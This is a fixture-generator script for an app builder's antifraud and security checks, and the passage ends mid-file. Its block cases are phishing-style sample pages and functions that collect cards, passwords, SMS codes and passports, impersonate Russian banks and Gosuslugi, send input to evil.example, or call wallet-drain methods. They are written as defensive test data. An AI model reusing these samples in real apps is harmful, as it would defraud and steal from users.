#!/usr/bin/env node
// Generates the G2 fixtures (gates.yaml#G2.antifraud_rules, abuse.yaml#scoring.fixtures, backlog M2-04):
//   test/antifraud/block/*.json — must be blocked (≥ 40; abuse.yaml#scoring.block_required included)
//   test/antifraud/allow/*.json — must pass every static G2 blocker (≥ 20: eval briefs, mockups 1–10 of
//                                 docs/wizard-concept-v3.html, abuse.yaml#scoring.allow_required)
//   test/antifraud/score/*.json — G2-AF-08 risk score (warn / pass)
//   test/fixtures/G2-*/{pass,fail-*}.json — a positive and a negative fixture per G2 check (gates.yaml#report.rules)
// Case format: {check, expect, description, base: forum|bakery|inline, spec: patches (inline: full spec), files,
//   milestone?, env?, slug?, abuse?, secrets?, sql?, runtimeSpec?, match?}. Patches: {op: set|push|remove, path}.
// Run: node packages/gates/scripts/gen-g2-fixtures.mjs   (test/g2-fixtures.test.ts checks the output is fresh)
import { mkdirSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = resolve(HERE, "../../..");
export const ANTIFRAUD_DIR = resolve(HERE, "../test/antifraud");
export const FIXTURES_DIR = resolve(HERE, "../test/fixtures");

const json = (p) => JSON.parse(readFileSync(join(REPO, p), "utf8"));
const FORUM = json("specs/appspec/examples/forum.json");
const BAKERY = json("specs/appspec/examples/bakery.json");
const ent = (spec, name) => spec.entities.findIndex((e) => e.name === name);
const fn = (spec, name) => spec.functions.findIndex((f) => f.name === name);
const T = (s) => `{${JSON.stringify(s)}}`;

// ------------------------------------------------------------------------------------------------ builders

/** A page module: texts are JSX expressions (no escaping issues); `form` holds inputs and buttons. */
function page({ title = "Проверка", texts = [], form = "", extra = "", imports = "", consent = false } = {}) {
  const kit = ["AppShell", "Button", "Field", ...(consent ? ["ConsentCheckbox"] : [])].join(", ");
  return `import { ${kit} } from "@wizard/ui-kit";
import { useState } from "@wizard/sdk";
${imports}
export default function Fx() {
  const [v, setV] = useState("");
${extra}
  return (
    <AppShell title=${T(title)}>
${texts.map((t) => `      <p>${T(t)}</p>`).join("\n")}
      <form>
${form}
      </form>
    </AppShell>
  );
}
`;
}
const field = (label, o = {}) =>
  `        <Field name=${JSON.stringify(o.name ?? "x")} label=${T(label)} type=${JSON.stringify(o.type ?? "string")}${
    o.placeholder ? ` placeholder=${T(o.placeholder)}` : ""
  } value={v} onChange={setV} />`;
const button = (text) => `        <Button type="submit">${T(text)}</Button>`;
const input = (attrs) => `        <input ${attrs} />`;

/** Spec patches adding the page ui/Fx.tsx for `roles`. */
const addPage = (_base, title, roles = ["visitor"]) => [
  { op: "push", path: "/pages", value: { route: "/fx", title, file: "ui/Fx.tsx", roles } },
];
const withPage = (base, opts, roles) => ({
  spec: addPage(base, opts.pageTitle ?? opts.title ?? "Проверка", roles),
  files: { "ui/Fx.tsx": page(opts) },
});
const addField = (base, entity, f) => [
  { op: "push", path: `/entities/${ent(base, entity)}/fields`, value: f },
];
const fnFile = (body, kind = "query") =>
  `import { ${kind}, v } from "@wizard/sdk";\n\nexport default ${kind}({\n  args: {},\n  handler: async (ctx) => {\n${body}\n  },\n});\n`;
const addFn = (_base, f, body) => ({
  spec: [{ op: "push", path: "/functions", value: f }],
  files: { [f.file]: fnFile(body, f.kind) },
});
const merge = (...parts) => ({
  spec: parts.flatMap((p) => p.spec ?? []),
  files: Object.assign({}, ...parts.map((p) => p.files ?? {})),
});

/** Luhn-valid 16-digit number with the given 15-digit prefix, grouped by 4. */
function luhnCard(prefix15) {
  for (let d = 0; d < 10; d++) {
    const s = `${prefix15}${d}`;
    let sum = 0;
    for (let i = 0; i < s.length; i++) {
      let x = Number(s[s.length - 1 - i]);
      if (i % 2 === 1) {
        x *= 2;
        if (x > 9) x -= 9;
      }
      sum += x;
    }
    if (sum % 10 === 0) return s.replace(/(\d{4})(?=\d)/g, "$1 ");
  }
  throw new Error("luhn");
}
const CARD = luhnCard("427600000000123");

// ------------------------------------------------------------------------------------------------ block

const F = FORUM;
const B = BAKERY;
const noTelegramLogin = F.roles
  .map((r, i) =>
    r.loginMethods ? { op: "set", path: `/roles/${i}/loginMethods`, value: ["email_otp"] } : null,
  )
  .filter(Boolean);
const noTelegram = [
  ...noTelegramLogin,
  { op: "remove", path: `/integrations/${F.integrations.findIndex((i) => i.connector === "telegram")}` },
  ...F.workflows
    .map((w, i) => (JSON.stringify(w).includes('"telegram"') ? i : -1))
    .filter((i) => i >= 0)
    .reverse()
    .map((i) => ({ op: "remove", path: `/workflows/${i}` })),
];

const BLOCK = {
  // G2-AF-01 — cards
  "card-spec-field": {
    check: "G2-AF-01",
    ...{ spec: addField(F, "ticket", { name: "card_no", label: "Номер карты", type: "string" }) },
  },
  "card-expiry-field": {
    check: "G2-AF-01",
    spec: addField(F, "ticket", { name: "exp", label: "Срок действия карты", type: "string" }),
  },
  "card-ui-label": { check: "G2-AF-01", ...withPage(F, { form: field("Номер банковской карты") }) },
  "card-ui-cvv": { check: "G2-AF-01", ...withPage(F, { form: field("Код", { placeholder: "CVV" }) }) },
  "card-input-name": {
    check: "G2-AF-01",
    ...withPage(F, { form: input('name="cardNumber" value={v} onChange={(e) => setV(e.target.value)}') }),
  },
  "card-autocomplete": {
    check: "G2-AF-01",
    ...withPage(F, {
      form: input('autoComplete="cc-number" value={v} onChange={(e) => setV(e.target.value)}'),
    }),
  },
  "card-mask": {
    check: "G2-AF-01",
    ...withPage(F, { form: field("Данные", { placeholder: "0000 0000 0000 0000" }) }),
  },
  "card-homoglyph": { check: "G2-AF-01", ...withPage(F, { form: field("Hомер кaрты") }) },
  "card-holder": { check: "G2-AF-01", ...withPage(F, { form: field("Держатель карты") }) },
  "card-luhn-code": {
    check: "G2-AF-01",
    files: {
      "functions/lib/check.ts": `export function valid(n: string): boolean {\n  let s = 0;\n  for (let i = 0; i < n.length; i++) {\n    let d = Number(n[n.length - 1 - i]);\n    if (i % 2 === 1) {\n      d = d * 2;\n      if (d > 9) d = d - 9;\n    }\n    s += d;\n  }\n  return s % 10 === 0;\n}\n`,
    },
  },
  // G2-AF-02 — credentials
  "cred-password-input": {
    check: "G2-AF-02",
    ...withPage(F, { form: input('type="password" value={v} onChange={(e) => setV(e.target.value)}') }),
  },
  "cred-password-label": { check: "G2-AF-02", ...withPage(F, { form: field("Пароль") }) },
  "cred-login-from": { check: "G2-AF-02", ...withPage(F, { form: field("Логин от Госуслуг") }) },
  "cred-sms-code": { check: "G2-AF-02", ...withPage(F, { form: field("Код из SMS") }) },
  "cred-pin": { check: "G2-AF-02", ...withPage(F, { form: field("PIN-код карты") }) },
  "cred-otp-spec": {
    check: "G2-AF-02",
    spec: addField(F, "ticket", { name: "otp", label: "Код", type: "string" }),
  },
  "cred-one-time": { check: "G2-AF-02", ...withPage(F, { form: field("Одноразовый код") }) },
  "cred-telegram-button-sms": {
    check: "G2-AF-02",
    description:
      "abuse.yaml block_required: «Войти через Telegram» без loginMethods telegram рядом с «Код из SMS»",
    ...merge(
      { spec: noTelegram },
      withPage(F, { form: [field("Код из SMS"), button("Войти через Telegram")].join("\n") }),
    ),
  },
  // G2-AF-03 — government ids
  "gov-passport": {
    check: "G2-AF-03",
    spec: addField(F, "ticket", {
      name: "doc",
      label: "Серия и номер паспорта",
      type: "string",
      pii: "basic",
    }),
  },
  "gov-snils": { check: "G2-AF-03", ...withPage(F, { form: field("СНИЛС") }) },
  "gov-inn-person": { check: "G2-AF-03", ...withPage(F, { form: field("ИНН физлица") }) },
  "gov-driver": { check: "G2-AF-03", ...withPage(F, { form: field("Водительское удостоверение") }) },
  "gov-scan-file": {
    check: "G2-AF-03",
    description: "abuse.yaml block_required: поле file «Скан паспорта»",
    milestone: "M2",
    spec: addField(F, "ticket", { name: "scan", label: "Скан паспорта", type: "file", pii: "basic" }),
  },
  "gov-photo-document": {
    check: "G2-AF-03",
    milestone: "M2",
    spec: addField(F, "ticket", { name: "photo_doc", label: "Фото документа", type: "file", pii: "basic" }),
  },
  "gov-pii-kind": {
    check: "G2-AF-03",
    spec: addField(F, "ticket", {
      name: "number_x",
      label: "Номер",
      type: "string",
      pii: "basic",
      piiKind: "snils",
    }),
  },
  // G2-AF-04 — brands
  "brand-app-gosuslugi": {
    check: "G2-AF-04",
    description: "abuse.yaml block_required: app.name «Госуслуги района»",
    spec: [{ op: "set", path: "/app/name", value: "Госуслуги района" }],
  },
  "brand-title-sber": {
    check: "G2-AF-04",
    description: "abuse.yaml block_required: title «Вход в Сбербанк Онлайн»",
    spec: [{ op: "set", path: "/pages/0/title", value: "Вход в Сбербанк Онлайн" }],
  },
  "brand-operator": {
    check: "G2-AF-04",
    spec: [{ op: "set", path: "/compliance/operatorName", value: "ПАО Сбербанк" }],
  },
  "brand-app-wb": {
    check: "G2-AF-04",
    spec: [{ op: "set", path: "/app/name", value: "Wildberries Partners" }],
  },
  "brand-appshell-title": { check: "G2-AF-04", ...withPage(F, { title: "Тинькофф" }) },
  "brand-forms-pay": { check: "G2-AF-04", ...withPage(F, { form: button("Оплатить через Тинькофф") }) },
  "brand-homoglyph": {
    check: "G2-AF-04",
    spec: [{ op: "set", path: "/app/name", value: "Cбербанк для бизнеса" }],
  },
  "brand-short-exact": { check: "G2-AF-04", spec: [{ op: "set", path: "/app/name", value: "МТС Бонус" }] },
  "brand-hyphen": { check: "G2-AF-04", spec: [{ op: "set", path: "/app/name", value: "Сбер-Банк Онлайн" }] },
  "brand-typo": { check: "G2-AF-04", spec: [{ op: "set", path: "/app/name", value: "Госуслуга" }] },
  "brand-slug": { check: "G2-AF-04", slug: "gosuslugi" },
  "brand-telegram-no-connector": {
    check: "G2-AF-04",
    ...merge({ spec: noTelegram }, withPage(F, { form: button("Войти через Telegram") })),
  },
  "brand-ambiguous-mir-card": {
    check: "G2-AF-04",
    ...merge(
      {
        spec: [
          {
            op: "remove",
            path: `/integrations/${F.integrations.findIndex((i) => i.connector === "yookassa")}`,
          },
        ],
      },
      { spec: [{ op: "set", path: "/app/name", value: "Мир — карта лояльности" }] },
    ),
  },
  // G2-AF-05 — data leaves
  "ext-form-action": {
    check: "G2-AF-05",
    ...withPage(F, { form: "", extra: "", texts: [] }),
    files: { "ui/Fx.tsx": page().replace("<form>", '<form action="https://evil.example/collect">') },
  },
  "ext-link-params": {
    check: "G2-AF-05",
    ...withPage(F, {
      form: `${field("Телефон", { type: "phone" })}\n        <a href={\`https://evil.example/c?phone=\${v}\`}>Далее</a>`,
    }),
  },
  "ext-location": {
    check: "G2-AF-05",
    ...withPage(F, {
      extra: '  const go = () => {\n    window.location.href = "https://evil.example/?c=" + v;\n  };',
      form: `${field("Код")}\n        <Button onClick={go}>Далее</Button>`,
    }),
  },
  "ext-iframe": {
    check: "G2-AF-05",
    ...withPage(F, { form: '        <iframe src="https://evil.example/form" />' }),
  },
  "ext-fn-egress": {
    check: "G2-AF-05",
    ...addFn(
      F,
      { name: "sendOut", kind: "action", file: "functions/sendOut.ts", public: true, roles: ["organizer"] },
      '    await ctx.http.fetch("https://evil.example/collect", { method: "POST", body: "x" });\n    return null;',
    ),
  },
  // G2-AF-06 — direct transfers
  "p2p-card": {
    check: "G2-AF-06",
    ...withPage(F, { texts: [`Переведите 1500 ₽ на карту ${CARD}, в комментарии — номер заказа`] }),
  },
  "p2p-account": {
    check: "G2-AF-06",
    ...withPage(F, { texts: ["Оплата на счёт 40817810099910004312 в любом банке"] }),
  },
  "p2p-sbp": {
    check: "G2-AF-06",
    ...withPage(F, { texts: ["Перевод по СБП на номер +7 912 345-67-89 (Анна)"] }),
  },
  "p2p-wallet": { check: "G2-AF-06", ...withPage(F, { texts: [`Оплата в USDT: 0x${"5a".repeat(20)}`] }) },
  "p2p-notify-template": {
    check: "G2-AF-06",
    spec: [
      {
        op: "set",
        path: `/workflows/${F.workflows.findIndex((w) => w.steps.some((s) => s.params?.text))}/steps/0/params/text`,
        value: `Ваша заявка принята. Переведите оплату на карту ${CARD}`,
      },
    ],
  },
  // G2-AF-07 — crypto
  "crypto-seed": { check: "G2-AF-07", ...withPage(F, { form: field("Сид-фраза кошелька") }) },
  "crypto-private-key": { check: "G2-AF-07", ...withPage(F, { form: field("Приватный ключ") }) },
  "crypto-ethereum": {
    check: "G2-AF-07",
    ...withPage(F, {
      extra: "  const connect = () => (window as unknown as { ethereum: unknown }).ethereum;",
      form: button("Подключить"),
    }),
  },
  "crypto-eth-send": {
    check: "G2-AF-07",
    ...withPage(F, { extra: '  const m = "eth_sendTransaction";', form: button("Подтвердить") }),
  },
  "crypto-approval": {
    check: "G2-AF-07",
    ...withPage(F, {
      extra:
        "  const drain = (c: { setApprovalForAll(a: string, b: boolean): void }) => c.setApprovalForAll(v, true);",
      form: button("Получить"),
    }),
  },
  // block_required ПДн: «Аллергии» in a participant registration
  "pii-allergies-participant": {
    check: "G2-PII-03",
    description: "abuse.yaml block_required: поле «Аллергии» в сущности регистрации участника",
    spec: addField(F, "ticket", { name: "allergies", label: "Аллергии", type: "string" }),
  },
};

// ------------------------------------------------------------------------------------------------ allow

function mockupTexts() {
  const html = readFileSync(join(REPO, "docs/wizard-concept-v3.html"), "utf8");
  const start = html.indexOf('<div class="screens">');
  const end = html.indexOf('<section class="sec" id="arch">');
  const part = html.slice(start, end).replace(/<style[\s\S]*?<\/style>/g, "");
  const chunks = part.split(/<span class="scr-n">(\d+)<\/span>/);
  const out = [];
  const decode = (s) =>
    s
      .replace(/&nbsp;/g, " ")
      .replace(/&laquo;/g, "«")
      .replace(/&raquo;/g, "»")
      .replace(/&mdash;/g, "—")
      .replace(/&ndash;/g, "–")
      .replace(/&lt;/g, "<")
      .replace(/&gt;/g, ">")
      .replace(/&quot;/g, '"')
      .replace(/&#(\d+);/g, (_, n) => String.fromCodePoint(Number(n)))
      .replace(/&amp;/g, "&");
  for (let i = 1; i < chunks.length; i += 2) {
    const texts = chunks[i + 1]
      .split(/<[^>]+>/)
      .map((t) => decode(t).replace(/\s+/g, " ").trim())
      .filter((t) => t && !/^Комментарий к экрану/.test(t));
    out.push({ n: Number(chunks[i]), title: texts[0], texts: texts.slice(1) });
  }
  if (out.length !== 10) throw new Error(`mockups: expected 10 screens, got ${out.length}`);
  return out;
}

/** A plausible spec for an eval brief (its title, entities, features, acceptance texts) without ПДн. */
function briefSpec(brief) {
  const strip = (s) => {
    let t = s;
    for (const c of brief.canaries ?? []) t = t.split(c).join("клиент");
    return t;
  };
  const label = (s) => s.split("::")[0].trim();
  const ex = brief.expected ?? {};
  const pay =
    /оплат|предоплат/i.test(brief.text) || (ex.must_have_features ?? []).some((f) => /yookassa/.test(f));
  const tg = /telegram|телеграм/i.test(brief.text);
  const entities = (ex.entities ?? []).map((e, i) => ({
    name: `item${i + 1}`,
    label: label(e).slice(0, 60),
    fields: [
      { name: "title", label: "Название", type: "string", required: true },
      { name: "details", label: "Описание", type: "text" },
    ],
  }));
  entities.push({
    name: "request",
    label: "Заявка",
    fields: [
      { name: "client_user", label: "Клиент", type: "ref", ref: { entity: "users" } },
      { name: "contact_name", label: "Имя", type: "string", pii: "basic", piiKind: "fio" },
      { name: "contact_phone", label: "Телефон", type: "phone", pii: "basic" },
      { name: "contact_email", label: "Email", type: "email", pii: "basic" },
      { name: "comment", label: "Комментарий к заявке", type: "text" },
    ],
    ownerField: "client_user",
    retention: { deleteAfterDays: 365, mode: "anonymize" },
  });
  const roles = [
    { name: "owner", label: "Администратор", access: "login", isAdmin: true, loginMethods: ["email_otp"] },
    {
      name: "client",
      label: "Клиент",
      access: "login",
      loginMethods: tg ? ["email_otp", "telegram"] : ["email_otp"],
    },
    { name: "visitor", label: "Посетитель", access: "public" },
  ];
  const permissions = [
    ...entities.map((e) => ({ role: "owner", entity: e.name, ops: ["read", "create", "update", "delete"] })),
    ...entities
      .filter((e) => e.name !== "request")
      .map((e) => ({ role: "visitor", entity: e.name, ops: ["read"] })),
    { role: "client", entity: "request", ops: ["read", "create"], rowFilter: { client_user: "$user.id" } },
  ];
  const integrations = [
    ...(pay
      ? [
          {
            name: "yookassa",
            connector: "yookassa",
            config: {},
            secretRefs: ["secret://yookassa_shop_id", "secret://yookassa_secret_key"],
          },
        ]
      : []),
    ...(tg
      ? [{ name: "telegram", connector: "telegram", config: {}, secretRefs: ["secret://telegram_bot_token"] }]
      : []),
  ];
  const features = (ex.must_have_features ?? []).map(label);
  const acs = (ex.acceptance_criteria ?? []).map(label);
  const ui = `import { AppShell, Button, ConsentCheckbox, Field } from "@wizard/ui-kit";
import { useEntityMutation, useState } from "@wizard/sdk";

export default function Main() {
  const [form, setForm] = useState({ name: "", phone: "", consent: false });
  const requests = useEntityMutation("request");
  return (
    <AppShell title=${T(brief.title)}>
      <p>${T(strip(brief.text))}</p>
      <ul>
${features.map((f) => `        <li>${T(f)}</li>`).join("\n")}
      </ul>
${acs.map((a) => `      <p>${T(a)}</p>`).join("\n")}
      <form onSubmit={(e) => { e.preventDefault(); void requests.create({ contact_name: form.name, contact_phone: form.phone }, { consent: true }); }}>
        <Field name="contact_name" label="Имя" type="string" value={form.name} onChange={(v) => setForm({ ...form, name: String(v) })} />
        <Field name="contact_phone" label="Телефон" type="phone" value={form.phone} onChange={(v) => setForm({ ...form, phone: String(v) })} />
        <ConsentCheckbox checked={form.consent} onChange={(v) => setForm({ ...form, consent: v })} />
        <Button type="submit">{"Отправить заявку"}</Button>
      </form>
    </AppShell>
  );
}
`;
  return {
    spec: {
      specVersion: "1",
      app: { name: brief.title.slice(0, 80), description: strip(brief.text).slice(0, 300), locale: "ru" },
      entities,
      roles,
      permissions,
      integrations,
      pages: [
        {
          route: "/",
          title: brief.title.slice(0, 80),
          file: "ui/Main.tsx",
          roles: ["visitor", "client", "owner"],
        },
      ],
      compliance: {
        operatorName: "ООО «Тестовая компания»",
        operatorContact: "privacy@company.example",
        operatorAddress: "г. Казань, ул. Тестовая, д. 1",
        operatorInn: "7707083893",
      },
    },
    files: { "ui/Main.tsx": ui },
  };
}

const ALLOW = {};
for (const f of readdirSync(join(REPO, "tools/eval/briefs"))
  .filter((x) => x.endsWith(".json"))
  .sort()) {
  const brief = json(`tools/eval/briefs/${f}`);
  const s = briefSpec(brief);
  ALLOW[`brief-${brief.id}`] = {
    description: `eval-бриф ${brief.id}: «${brief.title}»`,
    base: "inline",
    milestone: "M2",
    ...s,
  };
}
for (const m of mockupTexts()) {
  const base = m.n === 9 ? B : F;
  ALLOW[`mockup-${String(m.n).padStart(2, "0")}`] = {
    description: `тексты макета ${m.n} концепции: «${m.title}»`,
    base: m.n === 9 ? "bakery" : "forum",
    ...withPage(base, { title: m.title, texts: m.texts, form: button("Сохранить") }),
  };
}
Object.assign(ALLOW, {
  "req-telegram-reminders": {
    description: "«Напоминания в Telegram» и «Войти через Telegram» при loginMethods telegram",
    ...withPage(F, {
      texts: ["Напоминания в Telegram · данные удалятся через 30 дней после форума"],
      form: button("Войти через Telegram"),
    }),
  },
  "req-yookassa-pay": {
    description:
      "«Оплатить через ЮKassa», «Оплата картой Мир или через СБП», «предоплата через ЮKassa» при integrations[yookassa]",
    ...withPage(F, {
      texts: ["Предоплата 50% — 3 025 ₽ через ЮKassa"],
      form: [
        field("Оплата картой Мир или через СБП", { name: "pay_hint" }),
        button("Оплатить через ЮKassa"),
      ].join("\n"),
    }),
  },
  "req-mir-sweets": {
    description: "app.name «Мир сладостей» (название и текст), страница «Открытие сезона»",
    ...merge(
      {
        spec: [
          { op: "set", path: "/app/name", value: "Мир сладостей" },
          { op: "set", path: "/pages/0/title", value: "Открытие сезона" },
        ],
      },
      withPage(F, {
        title: "Мир сладостей",
        texts: ["Добро пожаловать в «Мир сладостей»! Открытие сезона — 1 июня"],
      }),
    ),
  },
  "req-validity": {
    description: "«Срок действия билета», «Срок действия промокода»",
    ...merge(
      { spec: addField(F, "ticket", { name: "valid_until", label: "Срок действия билета", type: "date" }) },
      withPage(F, {
        form: [
          field("Срок действия промокода", { name: "promo_valid" }),
          field("Срок действия билета", { name: "ticket_valid" }),
        ].join("\n"),
      }),
    ),
  },
  "req-venue-fields": {
    description:
      "«Адрес площадки», «Контакты организатора», «Название товара» в сущности-субъекте; «ул. Тараса Шевченко»",
    spec: [
      ...addField(F, "ticket", { name: "venue_address", label: "Адрес площадки", type: "string" }),
      ...addField(F, "ticket", {
        name: "organizer_contacts",
        label: "Контакты организатора",
        type: "string",
      }),
      ...addField(F, "ticket", { name: "merch_title", label: "Название товара", type: "string" }),
      ...addField(F, "ticket", {
        name: "venue",
        label: "Площадка",
        type: "enum",
        enum: [{ value: "main", label: "ул. Тараса Шевченко, 5" }],
      }),
    ],
    files: {
      "ui/Fx.tsx": page({
        texts: ["Адрес площадки: ул. Тараса Шевченко, 5", "Контакты организатора — в письме"],
      }),
    },
  },
  "req-allergens-catalog": {
    description:
      "«Состав: может содержать аллергены», «Аллергены: орехи, глютен» в каталоге кондитерской (сущность не субъект)",
    base: "bakery",
    ...merge(
      { spec: addField(B, "product", { name: "allergens", label: "Аллергены", type: "string" }) },
      withPage(B, { texts: ["Состав: может содержать аллергены", "Аллергены: орехи, глютен"] }),
    ),
  },
  "req-identifiers": {
    description: "идентификаторы shipping, spinner, option, topic в коде",
    ...withPage(F, {
      extra:
        '  const shipping = "Доставка";\n  const spinner = true;\n  const option = "a";\n  const topic = "Тема";',
      form: ["shipping", "spinner", "option", "topic"].map((n) => field("Параметр", { name: n })).join("\n"),
    }),
  },
  "req-forum-golden": { description: "эталон «форум» целиком" },
  "req-bakery-golden": { description: "эталон «кондитерская» целиком", base: "bakery" },
  "req-pin-word": {
    description: "слова с «пин», «отр» внутри и «отпечатать» не считаются учётными данными и биометрией",
    ...withPage(F, {
      form: [
        field("Спиннер загрузки", { name: "spinner_label" }),
        field("Отпечатать бейдж", { name: "print" }),
      ].join("\n"),
    }),
  },
});

// ------------------------------------------------------------------------------------------------ score

const SCORE = {
  "warn-new-free-urgent-brand": {
    expect: "warn",
    description: "новая org на Free + срочные слова + бренд в тексте → ≥ порога",
    abuse: { orgAgeDays: 1, plan: "free" },
    ...withPage(F, { texts: ["Срочно! Ваш аккаунт заблокирован, подтвердите данные. Поддержка Сбербанка"] }),
  },
  "warn-reports-fuzzy": {
    expect: "warn",
    description: "жалобы ранее + бренд с опечаткой на расстоянии 2",
    abuse: { abuseReportsPrev: 1 },
    spec: [{ op: "set", path: "/app/name", value: "Госуслугах онлайн" }],
  },
  "pass-forum": { expect: "pass", description: "эталон форума без сигналов" },
  "pass-free-only": {
    expect: "pass",
    description: "только Free и новая org — ниже порога",
    abuse: { orgAgeDays: 1, plan: "free" },
  },
};

// ------------------------------------------------------------------------------------------------ per-check

const leakTickets = (roles, body) =>
  addFn(
    F,
    { name: "leakTickets", kind: "query", file: "functions/leakTickets.ts", public: true, roles },
    body,
  );

const CHECKS = {
  "G2-PERM-01": {
    pass: { description: "форум: весь роль × сущность × операция через data API совпадает с правами" },
    "fail-runtime-drift": {
      description: "runtime обслуживает ревизию, где посетитель читает билеты, а права спеки это запрещают",
      runtimeSpec: [
        { op: "push", path: "/permissions", value: { role: "visitor", entity: "ticket", ops: ["read"] } },
      ],
      match: "visitor",
    },
  },
  "G2-PERM-02": {
    pass: { description: "форум: политики RLS совпадают с правами" },
    "fail-extra-policy": {
      description: "в схеме лишняя политика: читать билеты может любой",
      sql: ['CREATE POLICY "evil" ON {schema}."ticket" FOR SELECT TO PUBLIC USING (true)'],
      match: "RLS read",
    },
  },
  "G2-PERM-03": {
    pass: { description: "форум: rowFilter изолирует строки, публичные функции не отдают чужие" },
    "fail-function-rows": {
      description: "публичная функция участника отдаёт все билеты через ctx.systemDb",
      ...leakTickets(["participant"], "    return ctx.systemDb.ticket.list({ limit: 100 });"),
      match: "чужие записи",
    },
  },
  "G2-PERM-04": {
    pass: {
      description: "публичная функция посетителя возвращает ctx.systemDb.ticket.list(): runtime вырезает ПДн",
      ...leakTickets(["visitor"], "    return ctx.systemDb.ticket.list({ limit: 100 });"),
    },
    "fail-hidden-field": {
      description:
        "функция волонтёра возвращает скрытые от него поля билета (company, promo_code) через ctx.systemDb",
      ...leakTickets(
        ["volunteer"],
        "    const t = await ctx.systemDb.ticket.list({ limit: 100 });\n    return t.map((x) => ({ id: x.id, company: x.company, promo: x.promo_code }));",
      ),
      match: "скрытые поля",
    },
  },
  "G2-PERM-05": {
    pass: {
      description: "форум: у посетителя нет update/delete, systemDb в публичных функциях — только count",
    },
    "fail-public-update": {
      description: "посетитель может изменять потоки без rowFilter",
      spec: [
        {
          op: "set",
          path: `/permissions/${F.permissions.findIndex((p) => p.role === "visitor")}/ops`,
          value: ["read", "update"],
        },
      ],
      match: "изменять",
    },
    "fail-mutation-no-roles": {
      description: "публичная mutation без roles",
      ...addFn(
        F,
        { name: "touch", kind: "mutation", file: "functions/touch.ts", public: true },
        "    return null;",
      ),
      match: "не указано",
    },
    "fail-systemdb-public": {
      description:
        "кондитерская: freeSlots доступна посетителю и читает cake_order.list через ctx.systemDb без systemDbReason (L3-22)",
      base: "bakery",
      match: "systemDb",
    },
    "pass-systemdb-reason": {
      description: "та же функция с function.systemDbReason",
      base: "bakery",
      spec: [
        {
          op: "set",
          path: `/functions/${fn(B, "freeSlots")}/systemDbReason`,
          value: "Считает занятость дней по всем заказам, наружу — только числа",
        },
      ],
    },
  },
  "G2-SECRET-01": {
    pass: { description: "форум: секретов в коде и спеке нет" },
    "fail-telegram-token": {
      description: "токен Telegram-бота в коде функции",
      files: {
        "functions/lib/token.ts": `export const BOT = "${"1234567890"}:${"AAH".padEnd(35, "x7Q")}";\n`,
      },
      match: "шаблон ключа",
    },
    "fail-yookassa-in-spec": {
      description: "секретный ключ ЮKassa в конфиге интеграции",
      spec: [{ op: "set", path: "/integrations/0/config/note", value: `live_${"aB3".repeat(9)}` }],
    },
    "fail-entropy": {
      description: "случайная строка рядом с apiKey",
      files: { "functions/lib/key.ts": 'export const apiKey = "f8Kq2Zp9Lm4Xv7Rt1Wc6Yb3Nd5Hs0Je";\n' },
      match: "key/token/secret",
    },
    "fail-pem": {
      description: "приватный ключ PEM",
      files: { "functions/lib/pem.ts": 'export const k = "-----BEGIN RSA PRIVATE KEY-----";\n' },
    },
  },
  "G2-SECRET-02": {
    pass: { description: "prod: все секреты интеграций заданы в хранилище", env: "prod", secrets: ["*"] },
    "fail-missing-prod": {
      description: "prod: секрет telegram_bot_token не задан",
      env: "prod",
      secrets: [
        "yookassa_shop_id",
        "yookassa_secret_key",
        "telegram_webhook_secret",
        "smtp_password",
        "qr_signing_key",
      ],
      match: "telegram_bot_token",
    },
    "fail-not-ref": {
      description: "секрет передан не ссылкой secret://",
      spec: [{ op: "set", path: "/integrations/0/secretRefs/0", value: "shop_id_plain" }],
    },
  },
  "G2-PII-01": {
    pass: { description: "форум: особых категорий нет" },
    "fail-special": {
      description: "поле pii=special",
      spec: addField(F, "ticket", { name: "health", label: "Ограничения", type: "string", pii: "special" }),
      match: "особой категории",
    },
  },
  "G2-PII-02": {
    pass: { description: "форум: ПДн размечены" },
    "fail-phone-type": {
      description: "поле типа phone без pii",
      spec: addField(F, "ticket", { name: "extra_phone", label: "Доп. номер", type: "phone" }),
    },
    "fail-strong-name": {
      description: "«Фамилия» без pii в справочнике потоков (strong — в любой сущности)",
      spec: addField(F, "stream", { name: "curator", label: "Фамилия куратора", type: "string" }),
    },
    "fail-weak-in-subject": {
      description: "«Адрес» без pii в сущности-субъекте",
      spec: addField(F, "ticket", { name: "home", label: "Адрес проживания", type: "string" }),
    },
    "pass-weak-exception": {
      description: "«Адрес площадки» в сущности-субъекте — исключение",
      spec: addField(F, "ticket", { name: "venue_address", label: "Адрес площадки", type: "string" }),
    },
  },
  "G2-PII-03": {
    pass: {
      description: "форум: признаков спецкатегорий нет; «Аллергены» в каталоге не субъект",
      base: "bakery",
      spec: addField(B, "product", { name: "allergens", label: "Аллергены", type: "string" }),
    },
    "fail-allergies": {
      description: "«Аллергии» в регистрации участника",
      spec: addField(F, "ticket", { name: "allergies", label: "Аллергии", type: "string" }),
    },
    "fail-enum-religion": {
      description: "enum «Вероисповедание» в регистрации",
      spec: addField(F, "ticket", {
        name: "meal",
        label: "Питание",
        type: "enum",
        enum: [{ value: "a", label: "По вероисповеданию" }],
      }),
    },
  },
  "G2-PII-04": {
    pass: { description: "форум: форма регистрации с ConsentCheckbox" },
    "fail-no-consent": {
      description: "форма регистрации без ConsentCheckbox (registerTicket collectsPii)",
      files: {
        "ui/Landing.tsx": readFileSync(join(REPO, "specs/runtime/examples/ui/Landing.tsx"), "utf8")
          .replace(/\s*<ConsentCheckbox[^>]*\/>/, "")
          .replace("ConsentCheckbox, ", ""),
      },
      match: "согласия",
    },
    "fail-policy-route": {
      description: "страница системы занимает адрес политики",
      spec: [{ op: "set", path: "/compliance/policyPage", value: "/" }],
    },
  },
  "G2-PII-05": {
    pass: { description: "форум: retention у всех сущностей с ПДн" },
    "fail-no-retention": {
      description: "у заявок спикеров нет retention",
      spec: [{ op: "remove", path: `/entities/${ent(F, "speaker_application")}/retention` }],
    },
    "pass-waiver": {
      description: "retentionWaiver",
      spec: [
        { op: "remove", path: `/entities/${ent(F, "speaker_application")}/retention` },
        {
          op: "set",
          path: "/compliance/retentionWaiver",
          value: { reason: "Храним по договору с площадкой" },
        },
      ],
    },
  },
  "G2-PII-06": {
    pass: { description: "форум: оператор заполнен (M2, с адресом)", milestone: "M2" },
    "fail-no-name": {
      description: "нет operatorName",
      spec: [{ op: "remove", path: "/compliance/operatorName" }],
      match: "OPERATOR_NAME_REQUIRED",
    },
    "fail-no-address-m2": {
      description: "M2: нет operatorAddress",
      milestone: "M2",
      spec: [{ op: "remove", path: "/compliance/operatorAddress" }],
